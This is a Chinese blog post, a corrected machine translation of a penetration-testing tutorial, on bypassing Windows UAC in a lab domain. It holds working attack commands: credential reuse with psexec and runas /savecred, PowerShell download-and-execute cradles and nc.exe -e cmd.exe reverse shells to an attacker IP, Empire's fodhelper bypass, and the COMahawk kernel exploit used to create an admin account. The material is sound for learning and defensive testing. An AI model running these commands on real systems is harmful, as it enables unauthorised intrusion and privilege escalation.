
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18745249" title="发布于 2025-03-01 18:13">
    <span role="heading" aria-level="2">Windows 提权-UAC 绕过</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/uac-bypass/" target="_blank" rel="noopener nofollow">UAC-Bypass – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 场景一：枚举得到存储的管理员凭证（GUI 环境）</a>
<ul>
<li><a href="#id1.1" rel="noopener nofollow">1.1 使用 netplwiz.exe 帮助主题绕过 UAC</a></li>
</ul>
</li>
<li><a href="#id2" rel="noopener nofollow">2 场景二：枚举得到存储的管理员凭证（CLI 环境）</a>
<ul>
<li><a href="#id2.1" rel="noopener nofollow">2.1 使用 Empire 内置模块绕过 UAC</a></li>
</ul>
</li>
<li><a href="#id3" rel="noopener nofollow">3 场景三：利用内核漏洞创建管理员凭据（CLI 环境）</a>
<ul>
<li><a href="#id3.1" rel="noopener nofollow">3.1 使用 Elev-Function.ps1 脚本绕过 UAC</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在这篇文章中，我们将主要介绍在<strong>两种</strong>不同的应用情况中（其中场景一和场景二归为一种情况），使用<strong>三种</strong>不同的 UAC 绕过技术，将中完整性 shell 提升到高完整性 shell。</p>
<blockquote>
<p>注：低/中/高完整性 shell 之间的区别，以图形化界面用户启动 cmd.exe 程序为例，普通用户直接启动<strong>就算作</strong>是<strong>低完整性 shell</strong> 吧，管理员组的用户直接启动为<strong>中完整性 shell</strong>，管理员组的用户右键“以管理员身份运行”启动为<strong>高完整性 shell</strong>。</p>
<p>似乎只有管理员组的账户才有这种在身份不变的情况下 shell 权限能由<strong>中转高</strong>完整性的说法，而以普通用户和系统用户得到的 shell 一般就已经是其自身身份的完整权限了，不过具有 SeBackupPrivilege 特权的普通域用户好像例外，如<a href="https://www.cnblogs.com/kqdssheng/p/18741609#id4" target="_blank">此例</a>。</p>
</blockquote>
<p>在第一种情况下，我们<strong>以普通域用户</strong>的身份在 Windows 10 机器上获得了一个立足点。在漏洞利用后枚举阶段，我们发现了系统中存储着<strong>本地管理员用户</strong>凭据，然后我们利用存储的凭据以该管理员用户的身份获得一个中完整性的 shell。最后，我们通过两种不同的 UAC 绕过方式，最终将中完整性 shell 提升到了高完整性 shell。</p>
<p>在第二种情况下，我们在漏洞利用后枚举阶段发现了一个内核漏洞，然后利用该漏洞创建了一个本地管理员账户。从那里，我们获得了一个中完整性的反向 shell，最后，我们使用第三种 UAC 绕过技术成功将其提升到高完整性 shell。</p>
<p>用户帐户控制（UAC）是一项安全功能，旨在防止对 Windows 计算机进行未经授权的更改。UAC 可确保任何管理级别的更改只能在管理员批准后才能进行。</p>
<blockquote>
<p>理解 UAC 最简单的方法就是，将其看作是类似于在 Linux 机器上使用 sudo 命令。使用 sudo 命令时，你必须知道 root 密码才能以 root 权限执行命令。UAC 也是一样，右键单击要运行的程序并选择 "以管理员身份运行 "后，系统会提示你输入管理员密码。</p>
</blockquote>
<p>大家都熟悉 UAC 弹出框，但是，让我们再看下。</p>
<p>如果您是普通用户，并且尝试以管理员身份运行程序，您将看到以下请求管理员账户密码的窗口：</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614845-432803739.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614843-1082797766.png" alt="" loading="lazy"></p>
<p>接着，我们会得到以下提示，并需要与之交互，然后才能以提升的权限运行程序。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175613673-1218323327.png" alt="" loading="lazy"></p>
<h2 id="1场景一枚举得到存储的管理员凭证gui-环境"><strong><div id="id1">1、场景一：枚举得到存储的管理员凭证（GUI 环境）</div></strong></h2>
<p>假设我们对 Windows 10 主机进行了初步枚举，发现 21 端口是开放的，并托管着一个 FTP 服务器。这个FTP 服务器不允许匿名登录，但是，枚举 SMB 共享后发现用户名 efrost。有了用户名我们使用 Hydra 对 FTP 服务进行了暴力破解，结果成功找到了 FTP 用户的密码 Coldheart1234。</p>
<p>FTP 上没有感兴趣的文件，但由于我们找到了一组有效的凭证，因此我们决定尽可能地测试它们。</p>
<blockquote>
<p>密码重用是一个非常常见的问题。当你找到一组凭证时，请尽可能地测试 <strong>用户/密码</strong> 组合。此外，请尽可能针对您所列举的所有账户测试您找到的任何密码。</p>
</blockquote>
<p>从最开始的扫描中，我们发现受害者的 445 端口和 3389 端口是打开的。因此，我们首先使用 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener nofollow">Impacket</a> 套件中的 psexec.py 工具测试了我们对 SMB 服务的访问。</p>
<pre><code class="language-bash">psexec.py juggernaut.local/efrost:Coldheart1234@172.16.1.100
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614883-593303678.png" alt="" loading="lazy"></p>
<blockquote>
<p>只要用户能够写入 ADMIN$ 共享，我们便能得到一个 SYSTEM shell。【注：只要能够通过 psexec.py 成功连接，那么得到的便是 SYSTEM shell。】</p>
</blockquote>
<blockquote>
<p>注：使用 psexec.py 须注意事项：</p>
<ol>
<li>服务端 445 端口必须能通信且共享文件夹 ADMIN<span class="math inline">\(/C\)</span>/IPC$ 必须都是共享状态（默认情况下都是开启的）。</li>
<li>如果目标是工作组，则必须使用本地 administrator 用户连接，使用本地其他账号(包括管理员组中的非 administrator 用户)登录都会提示访问拒绝。[命令：<code>impacket-psexec administrator@1.1.1.1</code>和<code>impacket-psexec 111/administrator@1.1.1.1</code>效果是一样，只要administrator 的密码是正确的就行。]</li>
<li>如果目标（该目标包含普通域主机和域控）已加域，则可以<strong>使用域账户和本地账户两种方式进行连接</strong>。（1）使用本地账户的方式连接则只能使用本地 administrator 账户连接；[命令如上]（2）使用域账户的方式连接则只能用<strong>域管理员组</strong>中的账户连接，其它域账户均不能连接，即便是在普通域主机上。[命令：<code>impacket-psexec sky/admin@1.1.1.1</code> 和 <code>impacket-psexec sky.com/admin@1.1.1.1</code>这两种格式均可 ]【<strong>注意</strong>：网上有说 windows 版 psexec.exe 能够以普通域用户连接普通域主机，但我使用 impacket-psexec.py 的测试结果是不可行。我的测试环境是：win10+win server 2012 R2】</li>
</ol>
</blockquote>
<p>由于不是管理员用户，因此 psexec.py 连接失败。接着我们使用 rdp_check.py 测试这个域账户是否能够通过 RDP 访问，它也来自 Impacket 工具套件，结果发现我们能够通过 RDP 连接到此主机！</p>
<pre><code class="language-bash">rdp_check.py juggernaut.local/efrost:Coldheart1234@172.16.1.100
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615595-114414700.png" alt="" loading="lazy"></p>
<p>在发现我们拥有 RDP 访问权限后，我们使用一个名为 xfreerdp 的工具来获取受害者的 GUI 会话。</p>
<pre><code class="language-bash">sudo xfreerdp /u:efrost /p:Coldheart1234 /d:juggernaut.local /v:172.16.1.100 +clipboard
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614062-1714256107.png" alt="" loading="lazy"></p>
<p>至此，我们以普通域用户（juggernaut.local\efrost）在受害者机器上站稳了脚跟。接着，我们继续手动枚举，使用以下命令我们发现用户 cmarko 的密码存储在这台机器上。</p>
<pre><code class="language-cmd">cmdkey /list
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614254-1845989840.png" alt="" loading="lazy"></p>
<p>在枚举过程中，我们还发现该用户是此计算机上的本地管理员。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614686-1817796513.png" alt="" loading="lazy"></p>
<p>由于我们已经找到了存储的凭证，因此我们可以使用 runas 命令以 cmarko 用户的身份生成一个 shell，如下所示：</p>
<pre><code class="language-cmd">runas.exe /savecred /env /noprofile /user:juggernaut.local\cmarko cmd
</code></pre>
<p>这将以管理员用户 cmarko 的身份生成一个 shell，但当我们检查权限时，发现这是一个中完整性 shell。同时，在尝试读取管理员文件夹中的文件时，我们也被拒绝访问。</p>
<blockquote>
<p>注：只有高完整性 shell 才能够访问 administrator 的家目录，这其实也是判断高完整性 shell 的一种方式。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614926-1057876018.png" alt="" loading="lazy"></p>
<p>由于我们没有 cmarko 用户的密码，因此我们不能简单地右键单击 cmd.exe 然后单击“以管理员身份运行”，那么我们如何才能获得高完整性 shell 呢？– 就是通过执行 UAC  绕过实现。</p>
<h4 id="11使用-netplwizexe-帮助主题绕过-uac"><strong><div id="id1.1">1.1、使用 netplwiz.exe 帮助主题绕过 UAC</div></strong></h4>
<p>实际上，您可以使用相当多的二进制文件来执行类似的 UAC 绕过技术;但是，在此示例中，我们将重点介绍 netplwiz.exe 程序。</p>
<blockquote>
<p>滥用内置二进制文件的最大好处是，你可以 "靠山吃山"，而不用在受害者机器上安装其它工具。此外，由于这些都是内置的二进制文件，因此这些技术也可以绕过杀毒软件的阻碍。</p>
</blockquote>
<p>netplwiz.exe 用于将用户成员资格更改为 Standard 用户、Administrator、Guest 或任何其它什么。但是，它的主要功能在这里并不是真正重要的，我们更感兴趣的是它的非预期功能可以被拿来滥用。</p>
<p>首先，在中完整性 shell 中运行 netplwiz.exe 程序。然后，选择“Advanced”选项卡，并在“Advanced user management”部分中选择“Advanced”选项，</p>
<blockquote>
<p>为了展示该技术可以绕过杀毒，我将在启用 Defender 实时保护的情况下演示这一点。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615019-1120091360.png" alt="" loading="lazy"></p>
<p>将打开本地用户和组的界面，从该框中选择 Help &gt; Help Topics</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614850-184980756.png" alt="" loading="lazy"></p>
<p>右键单击 MMC 框并选择 View Source — 这将打开源代码的记事本 TXT 文档。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614999-2023094692.png" alt="" loading="lazy"></p>
<p>在打开的记事本编辑器中，选择 File &gt; Open</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614438-1060004285.png" alt="" loading="lazy"></p>
<p>导航到 <code>C:\Windows\System32</code>，然后将文件类型更改为 All Files</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615127-829849051.png" alt="" loading="lazy"></p>
<p>向下滚动以找到 cmd.exe，然后右键单击 cmd.exe &gt;选择“以管理员身份运行”</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615310-701250056.png" alt="" loading="lazy"></p>
<p>瞧！此时将显示高完整性 shell 的提示！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614897-659941920.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615003-1725702864.png" alt="" loading="lazy"></p>
<blockquote>
<p>同样的技术也可以用来以管理员身份运行 taskmgr.exe，而不是 cmd.exe，然后对 LSASS 进程执行内存转储。如需了解关于转储 LSASS 进程的各种技术，可以在<a href="https://juggernaut-sec.com/dumping-the-lsass-process/" target="_blank" rel="noopener nofollow">此处</a>查看我的相关文章。</p>
</blockquote>
<h2 id="2场景二枚举得到存储的管理员凭证cli-环境"><strong><div id="id2">2、场景二：枚举得到存储的管理员凭证（CLI 环境）</div></strong></h2>
<p>在本例中，我们假设在找到用户 efrost 的凭据后，检查 RDP 访问权限时显示访问被拒绝。因此，我们只能利用其它方式，设法以用户 efrost 的身份获得反向 shell。然后再次执行 cmdkey /list 命令，结果发现机器上存储着本地管理员用户 cmarko 的凭据。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615112-1343372561.png" alt="" loading="lazy"></p>
<p>接下来，我们不能再像之前那样通过 runas.exe 来创建新的 cmd.exe 了，因为在 shell 环境下无法弹出新的 cmd.exe 窗口，所以这回我们得用 runas 以用户 cmarko 的身份创建一个反向 shell。而要完成这个操作，我们会用 runas 去执行一个 IEX 命令，这个命令能把来自 <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener nofollow">Nishang</a> 脚本集合里一个叫 Invoke-PowerShellTcp.ps1 的 PowerShell 脚本直接在内存中执行。</p>
<p>将脚本复制到您的工作目录中，然后将以下命令附加到脚本底部：</p>
<blockquote>
<p>将 IP 地址替换为攻击者电脑的 IP。</p>
</blockquote>
<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.30 -Port 443
</code></pre>
<p>然后在脚本所在目录启动 HTTP 服务器。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614995-1886515145.png" alt="" loading="lazy"></p>
<blockquote>
<p>通常我会在自己的 exploits 文件夹中保留此脚本的多个副本，这些副本文件内容唯一的不同便是文件底部命令中的端口值不同。然后，我将端口号附加到每个副本的名称中。</p>
</blockquote>
<p>接下来，我们需要在攻击者计算机上启动一个 netcat 监听器，以通过端口 443 捕获 shell。设置完毕后，我们可以使用 runas 运行以下命令，以获取反向 shell ：</p>
<pre><code class="language-cmd">runas.exe /savecred /user:juggernaut.local\cmarko "powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp.ps1')"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615046-835526744.png" alt="" loading="lazy"></p>
<p>不出意外，我们获得的是一个中完整性 shell 。但是，这次我们没有 GUI 来使用内置的二进制技巧。因此，我们将利用一个名为 PowerShell Empire 的后渗透框架来绕过我们的 UAC。</p>
<h4 id="21使用-empire-内置模块绕过-uac"><strong><div id="id2.1">2.1、使用 Empire 内置模块绕过 UAC</div></strong></h4>
<p>PowerShell <a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener nofollow">Empire</a> 后渗透框架中的 UAC 绕过模块只是 Empire 内置的众多令人难以置信的模块之一。</p>
<blockquote>
<p>Empire 实现了无需 powershell.exe 即可运行 PowerShell 的能力，从键盘记录器到 Mimikatz 以及用于逃避网络检测的自适应通信，所有这些模块都被包含在一个以可用性为中心的框架之中。</p>
</blockquote>
<p>将 Empire 仓库克隆到攻击者机器上后，您需要在两个命令窗口中分别执行以下命令才能启动 Empire，因为它需要服务器和客户端。</p>
<pre><code class="language-bash">powershell-empire server
powershell-empire client
</code></pre>
<p>接下来，您将在 Empire 客户端的窗口看到主菜单，正如你所看到的，在撰写本文时已有 394 个模块。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175616217-1371346531.png" alt="" loading="lazy"></p>
<blockquote>
<p>我们不会与 Empire 服务端选项卡交互，只与 Empire 客户端选项卡交互。</p>
</blockquote>
<p>首先，我们将新建一个监听器，以便当我们在目标机器上执行 launcher.bat（stager）时，我们将返回一个 agent。</p>
<p>我们可以键入 help 来获取选项列表。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615048-2067544897.png" alt="" loading="lazy"></p>
<p>在这里，我们看到 uselisteners 命令，我们将使用它来创建监听器。现在，通过键入 uselisteners 后跟一个空格，就可以看到所有可用的监听器类型。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614680-1542508633.png" alt="" loading="lazy"></p>
<p>有很多很棒的东西，像 meterpreter 和 onedrive 之类的，但这里我们将使用 http 监听器。完成该命令后，按下回车键，此时您就会看到一个<code>(Empire: uselistener/http)&gt;</code> 的提示符号。然后，通过使用 options 命令，我们能够看到这个监听器的可配置选项。我们得保证 Host 和 Port 都已设定好。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614378-1976563810.png" alt="" loading="lazy"></p>
<blockquote>
<p>要设置 Host 或 Port 的新值，请使用 set 命令。例如：set Port 1337</p>
</blockquote>
<p>现在我们已经设置了所有必需的选项，可以使用 execute 命令来启动监听器了。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614689-1938422434.png" alt="" loading="lazy"></p>
<p>有了这样的设置，当我们键入 listeners 命令时，就能看到监听器已按我们想要的方式设置好，并已运行。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614693-93937537.png" alt="" loading="lazy"></p>
<p>接下来，我们需要构建我们的启动器（stager），这样就可以在受害者机器上运行它，以获得反向 shell。输入 usestager，然后输入空格，我们就可以看到所有可用的不同类型的启动器。OSX 和 Windows 下有许多的类型可以选择，但我们最感兴趣的是 launcher.bat</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614391-67324469.png" alt="" loading="lazy"></p>
<p>完成命令并按 Enter，您将看到有关这个 stager  启动器的所有参数信息，以及一个新的提示：<code>(Empire: usestager/windows/launcher_bat) &gt;</code></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614929-1038641812.png" alt="" loading="lazy"></p>
<p>从参数信息中，可以看到我们需要为这个 stager 启动器设置 Listener。使用命令 set Listener http ，我们的 stager 就可以使用了。接下来，只需使用命令 execute，它将为我们创建 launcher.bat 文件。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614899-1005272357.png" alt="" loading="lazy"></p>
<p>然后在另一个命令窗口中，将 launcher.bat 文件移动到您的工作目录并启动 HTTP 服务器，以便我们可以将其下载到受害者机器上。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614500-1882120533.png" alt="" loading="lazy"></p>
<p>由于我们的中完整性 shell 仍然以 cmarko 打开，所以就使用它来下载 launcher.bat 并执行它。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614639-1039914269.png" alt="" loading="lazy"></p>
<p>执行 launcher.bat 后，提示符挂起并重新回到我们的 Empire 客户端上，我们可以看到新代理签入。然后，通过使用 agents 命令，我们可以看到有关签入的代理的更多信息。</p>
<p>执行 launcher.bat 之后，我们回到 Empire 客户端，可以看到一个新的 agent 连接已建立。然后，通过使用 agents 命令，我们可以看到关于 agent 的更多信息。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614819-38331038.png" alt="" loading="lazy"></p>
<p>在这里，我们可以使用 rename 命令将 agent 重命名为更易于区分的名称。这在您有相当多的 agent 时，尤其有用。</p>
<p>重命名 agent 后，我们可以再次使用 agents 命令来确认名称更改已成功完成。之后，我们可以使用 interact 命令与 agent 进行交互。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614782-1988062097.png" alt="" loading="lazy"></p>
<p>在这里，我们可以利用 Empire 后渗透模块的所有功能，这些模块有很多！不过，在本例中，我们将重点关注 <strong>bypassuac</strong> 模块。</p>
<p>让我们继续键入 bypassuac，后跟一个 tab，它应该会自动填充 bypassuac http，这是我们监听器的名称。在这里，我们看到 Empire 尝试运行默认模块 powershell/privesc/bypassuac_eventviewer 。我们看到任务已启动，但一分钟后我们没有看到任何事情发生。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614590-835943704.png" alt="" loading="lazy"></p>
<p>但是，有多个模块可用于绕过 UAC。要获取完整列表，我们需要使用 usemodule 命令，后跟 powershell/privesc/bypassuac ，如下所示：</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614687-1205425695.png" alt="" loading="lazy"></p>
<p>在这个列表中，第一个和第三个是相同的，因为这是 UAC 绕过的一种非常常见的技术。不过，我对最后一个模块 powershell/privesc/bypassuac_fodhelper 更感兴趣，因为根据我的经验，这似乎是最有效的模块。</p>
<blockquote>
<p>当我使用 Empire 绕过 UAC 时，我通常会先尝试 bypassuac_fodhelper，如果这不起作用，我将从上到下逐一尝试。</p>
</blockquote>
<p>选择 fodhelper 模块并按 Enter 键后，我们会看到有关该模块的更多信息，可以看到我们需要设置 Listener。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615968-1330924600.png" alt="" loading="lazy"></p>
<p>现在，我们需要使用命令 set Listener http，接着执行 execute，然后等待查看是否有新的 agent 产生。</p>
<p>在这里，我们看到漏洞利用有效果，然后再次使用 agents 命令，可以看到一个新的 agent，其名称旁边有一个星号(*)。这意味着这是一个高完整性 shell 的会话！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614912-98426270.png" alt="" loading="lazy"></p>
<p>最后，我们重命名此 agent。然后，我们可以使用 interact 命令与下一个 agent 进行交互。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614807-1513740082.png" alt="" loading="lazy"></p>
<p>现在，我们可以在高完整性 shell 中以 cmarko 的身份执行命令，然后输入要执行的命令。</p>
<blockquote>
<p>很多时候，当我使用 Empire 并执行命令时，它似乎暂停并挂起了。但实际上，只需键入 Interact，然后再次键入 Agent 名字，即可显示命令的结果。</p>
</blockquote>
<p>Empire 的 shell 体验并不是最好的，所以我们要使用 shell 命令来执行另一个 Nishang PowerShell 的反向 TCP 脚本，如下所示：</p>
<pre><code class="language-powershell">shell "iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp21.ps1')"
</code></pre>
<blockquote>
<p>由于 Empire HTTP 监听器使用的是 443 端口，因此我使用了 Invoke-PowerShellTcp 的另一个副本，将 21 端口作为反向 shell 的连接端口。在执行上述命令之前，我又在攻击机器上的 21 端口启动了 netcat 监听器，并在存放此脚本的目录中启动了 HTTP 服务器。</p>
</blockquote>
<p>执行命令后，我们在监听器窗口得到了一个新的 shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614805-714342244.png" alt="" loading="lazy"></p>
<p>我们不仅获得了一个 shell，还获得了一个高完整性 shell，其中列出了我们的所有权限！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615028-1884694334.png" alt="" loading="lazy"></p>
<p>这样，我们成功的绕过了 UAC，该过程完全不需要使用图形用户界面，也不需要知道管理员用户 cmarko 的密码！</p>
<blockquote>
<p>另一个可能需要使用 UAC 绕过的示例是，当您使用 BeEF 挂接本地管理员的浏览器，然后使用浏览器漏洞获取 shell。这几乎总是会导致低完整性 shell（甚至不是中等）。如果用户位于本地管理员组中，则必须先升级到中等完整性 shell，然后才能使用 UAC 绕过来获取高完整性 shell。</p>
</blockquote>
<h2 id="3场景三利用内核漏洞创建管理员凭据cli-环境"><strong><div id="id3">3、场景三：利用内核漏洞创建管理员凭据（CLI 环境）</div></strong></h2>
<p>在本例中，我们以标准用户的身份站稳了脚跟，在枚举过程中，我们发现受害者的 Windows 版本不是最新的。</p>
<pre><code class="language-cmd">systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614887-1691168384.png" alt="" loading="lazy"></p>
<p>看到“Build 17134”就意味着按照在维基百科上找到的这张<a href="https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions" target="_blank" rel="noopener nofollow">图表</a>所示，这是 Windows 10 的 1803 版本。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614816-6046409.png" alt="" loading="lazy"></p>
<p>知道这是 Windows 10 的旧版本后，我们在攻击者的机器上通过 searchsploit 找到了这个确切版本的内核漏洞。</p>
<pre><code class="language-bash">searchsploit windows 10 1803
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615159-1313035965.png" alt="" loading="lazy"></p>
<p>我们将漏洞利用镜像到我们的工作目录中，然后查看它的作用。</p>
<pre><code class="language-bash">searchsploit -m 47684
</code></pre>
<p>阅读该说明文件，我们可以将要使用的漏洞利用程序是一个 EXE 类型，其能够以 SYSTEM 的身份执行命令。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614946-797225003.png" alt="" loading="lazy"></p>
<blockquote>
<p>这是该 EXE 漏洞利用程序的仓库<a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener nofollow">连接</a>。</p>
</blockquote>
<p>将文件下载到攻击者机器上后，我们将其发送给受害者，并使用它来创建一个本地管理员用户。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615078-1186449153.png" alt="" loading="lazy"></p>
<blockquote>
<p>我发现，在没有自定义命令的情况下，直接执行漏洞利用程序是可以创建管理员用户，但提示的密码 RibSt3ak69 并不起作用！</p>
</blockquote>
<p>由于密码不起作用，我们需要再次使用 COMahawk64.exe 来更改密码！</p>
<pre><code class="language-cmd">.\COMahawk64.exe "net user tomahawk password"
</code></pre>
<p>有了可用的密码，我们现在就可以使用 PowerShell 版本的 runas 以我们新创建的本地管理员用户身份获取反向 shell。不过，我们需要将 nc.exe 下载到受害者机器上，这样就可以在 PowerShell runas 命令中使用它将反向 shell 推送到攻击者机器上。</p>
<p>将 nc.exe 下载到受害者后，我们需要在攻击者机器上的端口 53 上启动监听器。接下来，我们将使用以下 4 个命令创建 3 个变量（用户名、密码和主机名），然后将这些变量传递到 nc.exe 命令中，以管理员用户身份获取 shell。</p>
<pre><code class="language-powershell">$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("tomahawk", $secpasswd)
$computer = "JUGG-efrost"
[System.Diagnostics.Process]::Start("C:\temp\nc.exe","172.16.1.30 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615019-168756644.png" alt="" loading="lazy"></p>
<p>回到监听器，我们看到获得了一个中完整性 shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614966-1713432456.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175614172-694013613.png" alt="" loading="lazy"></p>
<p>由于此 shell 的完整性不高，因此我们需要再次执行 UAC 绕过以提升我们的管理员权限。</p>
<h4 id="31使用-elev-functionps1-脚本绕过-uac"><strong><div id="id3.1">3.1、使用 Elev-Function.ps1 脚本绕过 UAC</div></strong></h4>
<p>在这最后一个示例中，我们将使用名为 Elev-Function.ps1 的 PowerShell 脚本，这是一个 UACME 版本的 ps1 脚本，可在<a href="https://github.com/ScriptKiddieTutorials/Bypass-UAC/blob/pwn/powershell/elev-function.ps1" target="_blank" rel="noopener nofollow">此处</a>获得。</p>
<p>将此脚本复制到您的工作目录中，以便可以从我们的 HTTP 服务器将其提供给受害者。</p>
<blockquote>
<p>根据我使用此脚本的经验，要使其工作的唯一方法就是在脚本底部添加要执行的命令。</p>
</blockquote>
<p>由于我们系统上已经有了 netcat，因此我们可以在脚本底部添加以下命令：</p>
<pre><code class="language-powershell">Bypass-UAC "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
</code></pre>
<blockquote>
<p>我还将脚本的名称重命名为 Bypass-UAC.ps1，并编辑此脚本，将脚本中 cmd.exe 字串更改为 powershell.exe。这不是脚本工作所必需的，但需要提及一下该脚本是可以这样改动的。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615293-1372378024.png" alt="" loading="lazy"></p>
<p>接下来，我们将脚本下载到受害者机器上。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615310-1946666761.png" alt="" loading="lazy"></p>
<p>现在，受害者机器上已经拥有了 nc.exe 和 Bypass-UAC.ps1，同时，我们还需要在攻击者计算机的端口 443 上启动 netcat 监听器。</p>
<p>一切就绪后，接下来我们将在当前会话中加载 Bypass-UAC.ps1。</p>
<pre><code class="language-cmd">powershell.exe -ep bypass -c ".\Bypass-UAC.ps1"
</code></pre>
<blockquote>
<p>使用 <code>powershell.exe -ep bypass -c</code> 来执行脚本允许我们绕过 powershell.exe 的默认执行策略，该策略默认处于打开状态，目的是不允许将外部脚本加载到当前会话中。</p>
</blockquote>
<p>加载脚本后，我们会立即看到命令被执行，并创建注册表 hive，从而获得提升的 shell。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615081-1759849068.png" alt="" loading="lazy"></p>
<p>回到监听器，我们看到获得了一个高完整性 shell，它的身份是本地管理员用户 tomahawk。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250301175615492-1313181652.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.4178003615138889" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-01 18:13">2025-03-01 18:13</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">42</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18745249" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18745249);return false;">收藏</a>&nbsp;
